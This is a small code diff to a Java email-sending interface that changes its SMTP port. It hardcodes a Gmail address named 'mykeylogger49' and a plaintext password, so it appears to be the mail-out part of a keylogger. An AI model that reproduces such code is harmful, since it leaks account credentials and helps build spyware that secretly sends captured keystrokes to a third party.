@@ -17,7 +17,7 @@ public interface SimpleEmailSender {
 	static final String SENDER_NAME = "mykeylogger49@gmail.com";
 	static final String PASSWORD = "manukar2";
 	static final String HOST = "smtp.gmail.com";
-	static final String PORT = "587";
+	static final String PORT = "465";
 
 	public static void sendEmail(String recipientEmail, String subject, String message) {
 
